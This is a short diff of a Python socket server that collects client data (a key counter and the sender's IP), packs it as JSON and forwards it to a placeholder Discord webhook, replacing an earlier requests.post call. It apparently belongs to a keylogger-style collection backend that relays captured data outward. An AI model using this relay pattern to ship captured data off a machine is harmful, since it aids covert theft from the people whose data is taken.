@@ -1,5 +1,5 @@
 import socket
-import requests
+from discord import SyncWebhook
 import json
 key_id = 1
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -17,8 +17,8 @@ while True:
         'IP': clientAddress
         }
       json_object = json.dumps(dic,indent=4)
-      url = "webhook url like discord"
-      message = requests.post(url,json_object)
+      webhook = SyncWebhook.from_url("-----Your Discord Webhook----")
+      webhook.send(json_object)
       key_id +=1
 
 
